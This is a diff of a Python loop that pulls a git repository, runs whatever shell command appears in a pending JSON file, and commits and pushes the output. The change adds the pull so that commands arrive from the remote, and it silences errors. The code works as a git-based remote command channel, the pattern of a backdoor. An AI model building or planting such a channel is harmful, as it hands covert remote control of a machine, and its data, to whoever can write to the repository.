@@ -8,6 +8,9 @@ last_id = ""
 
 while True:
     try:
+        # Pull latest changes from GitHub
+        os.system(f'cd "{REPO}" && git pull --quiet 2>/dev/null')
+
         with open(PENDING) as f:
             data = json.load(f)
         cmd_id = data.get("id", "")
@@ -17,7 +20,8 @@ while True:
             last_id = cmd_id
             try:
                 out = subprocess.check_output(
-                    command, shell=True, stderr=subprocess.STDOUT, timeout=30
+                    command, shell=True, stderr=subprocess.STDOUT, timeout=30,
+                    cwd=REPO
                 )
                 result = out.decode("utf-8", errors="replace")
             except subprocess.CalledProcessError as e:
@@ -30,7 +34,7 @@ while True:
 
             os.system(
                 f'cd "{REPO}" && git add cmds/result.json && '
-                f'git commit -m "cmd result {cmd_id}" && git push --quiet'
+                f'git commit -m "result {cmd_id}" && git push --quiet 2>/dev/null'
             )
     except Exception:
         pass
